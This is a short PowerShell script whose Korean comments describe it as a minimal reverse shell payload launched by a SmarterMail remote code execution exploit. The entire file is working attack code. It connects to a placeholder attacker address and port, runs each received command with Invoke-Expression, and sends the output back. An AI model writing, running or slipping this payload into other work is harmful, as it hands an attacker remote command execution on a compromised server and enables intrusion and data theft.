# PowerShell Reverse Shell (최소 버전)
# SmarterMail RCE(test.py)가 실행시키는 페이로드

$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $stream.Write(([System.Text.Encoding]::ASCII).GetBytes($sendback), 0, $sendback.Length)
    $stream.Flush()
}

$client.Close()
